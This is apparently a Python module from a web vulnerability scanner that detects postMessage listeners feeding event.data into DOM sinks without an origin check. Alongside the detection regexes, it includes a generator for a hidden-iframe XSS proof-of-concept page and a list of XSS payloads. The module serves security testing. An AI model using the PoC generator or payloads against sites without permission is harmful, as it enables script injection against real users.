"""postMessage handler XSS detection.

`window.postMessage` is the standard cross-origin messaging API.  When a
receiver page registers a `message` listener and passes `event.data` to a
sink (innerHTML, eval, Function, document.write, location, src, etc.)
WITHOUT validating `event.origin`, any origin (including the attacker's
page that opens the victim in an iframe) can deliver an XSS payload.

Vulnerable pattern:

    window.addEventListener('message', function(e) {
        document.getElementById('out').innerHTML = e.data;   // sink!
    });                                                       // no origin check

Exploitation:
    <iframe src="https://victim.example/app"></iframe>
    <script>
      frames[0].postMessage('<img src=x onerror=alert(1)>', '*');
    </script>

This module scans the page's inline and external (when fetched) scripts for
message listeners and reports:
  * whether a sink is fed by event.data
  * whether origin validation is missing (the critical flaw)
  * a PoC HTML file that exploits the vulnerability
"""
from __future__ import annotations
import re

# Match `window.addEventListener('message', ...)` and `window.onmessage = ...`
MESSAGE_LISTENER_RE = re.compile(
    r'(?:addEventListener\s*\(\s*["\']message["\']'
    r'|\.onmessage\s*=)',
    re.IGNORECASE,
)

# Heuristic origin-check pattern: any reference to `event.origin` /
# `e.origin` / `message.origin` inside the script suggests a check exists.
ORIGIN_CHECK_RE = re.compile(
    r'\b(?:event|e|msg|message|evt)\.origin\b',
    re.IGNORECASE,
)

# Sinks fed by `event.data` (or any alias).  Each entry:
# (sink_regex, severity, description)
DANGER_SINKS: list[tuple[str, str, str]] = [
    (r'\.innerHTML\s*[\+\-\*\/]?=', "high",
     "innerHTML assignment from postMessage payload"),
    (r'\.outerHTML\s*[\+\-\*\/]?=', "high",
     "outerHTML assignment from postMessage payload"),
    (r'insertAdjacentHTML\s*\(', "high",
     "insertAdjacentHTML from postMessage payload"),
    (r'document\.write\s*\(', "high",
     "document.write from postMessage payload"),
    (r'document\.writeln\s*\(', "high",
     "document.writeln from postMessage payload"),
    (r'\beval\s*\(', "high",
     "eval() of postMessage payload"),
    (r'setTimeout\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setTimeout(string) from postMessage payload"),
    (r'setInterval\s*\(\s*[^,)]*[a-zA-Z]', "high",
     "setInterval(string) from postMessage payload"),
    (r'new\s+Function\s*\(', "high",
     "new Function() of postMessage payload"),
    (r'\.src\s*[\+\-\*\/]?=', "high",
     ".src assignment from postMessage payload"),
    (r'\.href\s*[\+\-\*\/]?=', "high",
     ".href assignment from postMessage payload"),
    (r'\.action\s*[\+\-\*\/]?=', "high",
     ".action assignment from postMessage payload"),
    (r'location\s*[\+\-\*\/]?=', "high",
     "location assignment from postMessage payload"),
    (r'location\.href\s*[\+\-\*\/]?=', "high",
     "location.href assignment from postMessage payload"),
    (r'location\.assign\s*\(', "medium",
     "location.assign from postMessage payload"),
    (r'\.setAttribute\s*\(\s*["\'](?:on\w+|href|src|action|formaction|style|data-[a-z]+)["\']',
     "medium",
     "setAttribute for dangerous attribute from postMessage payload"),
    (r'jQuery\s*(?:\.\s*html\s*\(|\$\([^)]*\)\.html\s*\()', "high",
     "jQuery .html() from postMessage payload"),
    (r'\$\s*\([^)]*\)\s*\.(?:append|prepend|after|before|replaceWith|wrap)\s*\(',
     "medium",
     "jQuery DOM insertion from postMessage payload"),
]

# Combined regex for sink detection (any sink).
SINK_RE = re.compile(
    "|".join("(?:%s)" % s[0] for s in DANGER_SINKS),
    re.IGNORECASE,
)

# Reference to event.data: `<alias>.data` where alias is the listener arg.
# Common aliases: e, ev, event, msg, message, evt, data, d.
DATA_REF_RE = re.compile(
    r'\b(?:event|e|ev|msg|message|evt|d|data|payload)\.data\b',
    re.IGNORECASE,
)


def find_message_listeners(html_or_js: str) -> list[dict]:
    """Find message listener blocks in the page/script.

    Returns a list of dicts: {
        "snippet":  str,   # ~300 chars around the listener
        "has_sink": bool,  # listener body calls a dangerous sink
        "has_data_ref": bool,  # listener references event.data
        "has_origin_check": bool,  # listener references event.origin
        "sinks_found": list[str],  # human-readable sink descriptions
        "exploitable": bool,  # has_sink AND has_data_ref AND NOT has_origin_check
    }
    """
    if not html_or_js:
        return []
    findings: list[dict] = []
    # Extract <script> blocks if HTML; treat raw JS as one block.
    script_blocks: list[str] = []
    for m in re.finditer(r'<script[^>]*>(.*?)</script>',
                         html_or_js, re.IGNORECASE | re.DOTALL):
        script_blocks.append(m.group(1))
    if not script_blocks:
        script_blocks = [html_or_js]
    for script in script_blocks:
        for lm in MESSAGE_LISTENER_RE.finditer(script):
            start = max(0, lm.start() - 40)
            end = min(len(script), lm.end() + 600)
            snippet = script[start:end]
            has_sink = bool(SINK_RE.search(snippet))
            has_data_ref = bool(DATA_REF_RE.search(snippet))
            has_origin_check = bool(ORIGIN_CHECK_RE.search(snippet))
            sinks_found = [desc for pat, _, desc in DANGER_SINKS
                           if re.search(pat, snippet, re.IGNORECASE)]
            exploitable = (has_sink and has_data_ref and not has_origin_check)
            findings.append({
                "snippet": snippet.strip()[:400],
                "has_sink": has_sink,
                "has_data_ref": has_data_ref,
                "has_origin_check": has_origin_check,
                "sinks_found": sinks_found,
                "exploitable": exploitable,
            })
    return findings


def analyze_page(html: str) -> dict:
    """Analyze a page for vulnerable postMessage handlers.

    Returns: {
        "has_listener":  bool,
        "vulnerable_count": int,
        "listeners":     list[dict],   # only exploitable ones
        "missing_origin_check": bool,  # any listener lacks origin check
    }
    """
    listeners = find_message_listeners(html)
    vulnerable = [l for l in listeners if l["exploitable"]]
    return {
        "has_listener": bool(listeners),
        "vulnerable_count": len(vulnerable),
        "listeners": vulnerable,
        "missing_origin_check": any(
            not l["has_origin_check"] for l in listeners
        ),
    }


def build_poc_html(target_url: str, payload: str = "<img src=x onerror=alert(1)>") -> str:
    """Build a PoC HTML page that exploits a missing-origin-check listener.

    The PoC opens the victim in a hidden iframe and posts the payload.
    """
    return f"""<!doctype html>
<html><head><meta charset="utf-8"><title>postMessage XSS PoC</title></head>
<body>
<h2>postMessage XSS PoC</h2>
<p>Victim: <code>{target_url}</code></p>
<iframe id="v" src="{target_url}" style="width:1px;height:1px;opacity:0"></iframe>
<script>
  var v = document.getElementById('v');
  // Wait for the victim frame to register its listener.
  v.onload = function() {{
    try {{
      v.contentWindow.postMessage({repr(payload)}, '*');
    }} catch (e) {{
      console.log('postMessage failed:', e);
    }}
  }};
</script>
</body></html>
"""


def dangerous_payloads() -> list[str]:
    """High-yield postMessage payloads for testing."""
    return [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
    ]
